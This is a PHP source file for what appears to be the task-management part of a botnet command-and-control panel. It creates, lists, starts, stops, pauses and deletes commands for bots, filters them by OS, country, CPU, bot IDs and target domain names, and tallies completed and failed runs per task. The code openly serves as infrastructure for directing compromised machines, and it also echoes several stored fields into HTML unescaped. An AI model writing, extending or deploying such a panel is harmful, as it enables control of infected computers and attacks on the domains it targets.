<?php

class Model_Tasks extends Model
{

    public function get_data()
    {

    }

    public function getTasks()
    {
        $tasks_array = $this->getDB()->queryRows('SELECT main_tasks.*, tasks_types.type_name as command_name FROM main_tasks INNER JOIN tasks_types ON main_tasks.method_type = tasks_types.id ORDER BY id DESC');
        if (!empty($tasks_array))
        {
            $tasks_count = count($tasks_array);

            for($pos = 0; $pos < $tasks_count; ++$pos)
            {
                $stat_good = $this->getDB()->queryValue('SELECT COUNT(*) FROM taskslog WHERE task_id = :id AND status = 1 AND is_completed = 1',
                    array(':id' => $tasks_array[$pos]['id']));
                $stat_error = $this->getDB()->queryValue('SELECT COUNT(*) FROM taskslog WHERE task_id = :id AND status = 0 AND is_completed = 1',
                    array(':id' => $tasks_array[$pos]['id']));
                $tasks_array[$pos]['stat_good'] = $stat_good > 0 ? $stat_good : 0;
                $tasks_array[$pos]['stat_error'] = $stat_error > 0 ? $stat_error : 0;
            }
            return $tasks_array;
        }
        return null;
    }

    /*
     * Generate tasks list for view
     */
    public function loadTasksList()
    {
        $taskListHtml = '';

        $tasks = $this->getTasks();

        if ($tasks == null)
        {
            return 'Tasks do not exist. Press "Add new task" to create a first task.';
        }

        foreach ($tasks as $task) {
            $status = '';
            switch((int)$task['status'])
            {
                case TaskStatus::Active:
                    $status = '<span class="label label-info">Works</span>';
                    break;
                case TaskStatus::Stopped:
                    $status = '<span class="label label-warning">Stopped</span>';
                    break;
                case TaskStatus::Completed:
                    $status = '<span class="label label-success">Completed</span>';
                    break;
                case TaskStatus::Paused:
                    $status = '<span class="label label-warning">Paused</span>';
                    break;
            }
            $taskListHtml = $taskListHtml . '
            <div class="col-sm-12 col-md-12 col-lg-12 tasks-task-blocks">
            <div class="col-sm-12 col-md-12 col-lg-12 panel panel-white tasks-task-block">
                <div class="tasks-task-block__top collapsed" data-toggle="collapse" data-target="#collapsePanel'. $task['id'] .'" aria-expanded="false" aria-controls="#collapsePanel'. $task['id'] .'">
                    <div class="tasks-task-block__id" data-tasks-task-id="'.$task['id'].'">#'. $task['id'] .'</div>
                    <div class="tasks-task-block__name">Comment:<span>'. htmlspecialchars($task['context']) .'</span></div>
                    <div class="tasks-task-block__status">'. $status .'</div>
                </div>
                <div style="height: 1px;" class="tasks-task-block__bottom collapse" id="collapsePanel'. $task['id'] .'">
                    <div>
                        <div class="tasks-task-block__action">
                            <div class="btn-group" role="group">
                                <button type="button" class="btn dropdown-toggle" style="background-color: #E6E8EB;" data-toggle="dropdown" aria-expanded="false">
                                    Actions
                                    <span class="caret"></span>
                                </button>
                                <ul class="dropdown-menu" style="margin-right: 40px;" role="menu">';
            if (!(int)$task['status'] !== TaskStatus::Completed)
            {
                $taskListHtml .=
                '<li><a href="#" onclick="tasksListRow.startTask('.$task['id'].')">Start</a></li>
                <li><a href="#" onclick="tasksListRow.stopTask('.$task['id'].')">Stop</a></li>
                <li><a href="#" onclick="tasksListRow.pauseTask('.$task['id'].')">Pause</a></li>';
            }

            $taskListHtml .=
                                    '<li><a href="#" onclick="tasksListRow.deleteTask('.$task['id'].')">Delete</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="tasks-task-block__info">
                            <div class="tasks-task-block__line">
                                <div class="tasks-task-block__title">Command:</div>
                                <div class="tasks-task-block__val">'. htmlspecialchars($task['command_name']) .'</div>
                            </div>
                            <div class="tasks-task-block__line">
                                <div class="tasks-task-block__title">CPU</div>
                                <div class="tasks-task-block__val">'. $task['cpu'] .'</div>
                            </div>
                            <div class="tasks-task-block__line">
                                <div class="tasks-task-block__title">OS</div>
                                <div class="tasks-task-block__val">'. ($task['os'] == '0' ? 'infinity' : implode(', ', json_decode($task['os']))) .'</div>
                            </div>
                            <div class="tasks-task-block__line">
                                <div class="tasks-task-block__title">Country</div>
                                <div class="tasks-task-block__val">'. ($task['country'] == '0' ? 'infinity' : implode(', ', json_decode($task['country']))) .'</div>
                            </div>
                            <div class="tasks-task-block__line">
                                <div class="tasks-task-block__title">Bot ID`s</div>
                                <div class="tasks-task-block__val">'. $task['bot_ids'] .'</div>
                            </div>
                            <div class="tasks-task-block__line">
                                <div class="tasks-task-block__title">Flows</div>
                                <div class="tasks-task-block__val">'. $task['flows']  .'</div>
                            </div>
                            <div class="tasks-task-block__line">
                                <div class="tasks-task-block__title">Domain names</div>
                                <div class="tasks-task-block__val">'. $task['domain_names'] .'</div>
                            </div>
                            <div class="tasks-task-block__line">
                                <div class="tasks-task-block__title">Flags</div>
                                <div class="tasks-task-block__val">'. htmlspecialchars($task['flags']) .'</div>
                            </div>
                        </div>
                        <div class="tasks-task-block-statistic">
                        <div class="tasks-task-block-statistic__left">
                            <span class="label label-success">'. $task['stat_good'] .'</span>
                            <span class="label label-danger">'. $task['stat_error'] .'</span>
                            <span class="label label-default">'. $task['bots'] .'</span>
                        </div>
                        <div class="tasks-task-block-statistic__right">
                            <span class="label label-primary">Processed: '. $task['bots_with_task'] .'</span>
                        </div>
                    </div>
                    </div>
                </div>
            </div>
        </div>
        ';
        }

        return $taskListHtml;
    }

    public function getTasksOptions()
    {
        // tasks
        $select_os = $this->getOptionsData('os');
        $total_bots_cpu = $this->getDB()->queryValue('SELECT MAX(cpu) FROM bots');
        $select_contry = $this->getOptionsData('country');
        $select_type = $this->getTaskTypes();

        return array('select_os' => $select_os, 'select_country' => $select_contry, 'total_bots_cpu' => !empty($total_bots_cpu) ? $total_bots_cpu : 0, 'select_type' => $select_type);
    }

    public function createTask()
    {
        if ($this->taskInfoIsCorrect())
        {
            $sid = $this->getDB()->queryValue('SELECT module_id FROM tasks_types WHERE id=:id', array(':id' => $this->request_data['method_type']));
            $new_task = new Task($this->request_data['os'] == 0 ? 0 : json_encode($this->request_data['os']),
                $this->request_data['country'] == 0 ? 0 : json_encode($this->request_data['country']),
                $this->request_data['bot_ids'],
                $this->request_data['flows'],
                $this->request_data['domain_names'],
                $this->request_data['bots'],
                $this->request_data['cpu'],
                $this->request_data['method_type'],
                $sid,
                $this->request_data['context'],
                (!empty($this->request_data['flags']) || $this->request_data['flags'] == 0) ? $this->request_data['flags'] : 0);

            $task_id = $this->getDB()->insert('main_tasks', (array)$new_task);
            if ($task_id > 0)
            {
                return true;
            }
        }
        return false;
    }

    public function updateTask()
    {
        if(!empty($this->request_data['task_id']) && !empty($this->request_data['action']))
        {
            $resp = '';
            switch($this->request_data['action'])
            {
                case 'delete':
                    $this->getDB()->sql('DELETE FROM main_tasks WHERE id=:id', array(':id' => $this->request_data['task_id']));
                    break;
                case 'pause':
                    $this->getDB()->update('main_tasks', array('status' => TaskStatus::Paused), 'id=:id', array(':id' => $this->request_data['task_id']));
                    break;
                case 'start':
                    $this->getDB()->update('main_tasks', array('status' => TaskStatus::Active), 'id=:id', array(':id' => $this->request_data['task_id']));
                    break;
                case 'stop':
                    $this->getDB()->update('main_tasks', array('status' => TaskStatus::Stopped), 'id=:id', array(':id' => $this->request_data['task_id']));
                    break;
            }
            return true;
        }
        return false;
    }

    private function taskInfoIsCorrect()
    {
        if (!empty($this->request_data['method_type']) &&
            (!empty($this->request_data['bots']) || $this->request_data['bots'] == 0) && 
            (!empty($this->request_data['cpu']) || $this->request_data['cpu'] == 0) &&
            (!empty($this->request_data['os']) || $this->request_data['os'] == 0) &&
            (!empty($this->request_data['country']) || $this->request_data['country'] == 0))
        {
            return true;
        }
        return false;
    }

    private function getOptionsData($column)
    {
        $result='';
        $data = $this->getDB()->queryRows('SELECT distinct '.$column.' FROM bots');

        foreach($data as $data_new)
        {
            $data_new[$column] = !empty($data_new[$column]) ? $data_new[$column] : 'Unknown';
            $result.='<option value="'.$data_new[$column].'">'.$data_new[$column].'</option>';
        }

        return $result;
    }

    private function getTaskTypes()
    {
        $result = '';
        $types_array = $this->getDB()->queryRows('SELECT * FROM tasks_types');

        foreach($types_array as $type){
            $result.='<option value="'.$type['type_identify'].'">'.$type['type_name'].'</option>';
        }

        return $result;
    }


}

class Task
{
    public $time;
    public $os;
    public $country;
    public $bot_ids;
    public $flows;
    public $domain_names;
    public $bots;
    public $cpu;
    public $method_type;
    public $sid;
    public $context;
    public $flags;


    public function __construct($os, $country, $bot_ids, $flows, $domain_names, $bots, $cpu, $method_type, $sid, $context, $flags = 0)
    {
        $this->os = $os;
        $this->country = $country;
        $this->bot_ids = $bot_ids;
        $this->flows = $flows;
        $this->domain_names = $domain_names;
        $this->bots = $bots;
        $this->cpu = $cpu;
        $this->method_type = $method_type;
        $this->sid = $sid;
        $this->context = $context;
        $this->flags = $flags;
        $this->time = time();
    }
}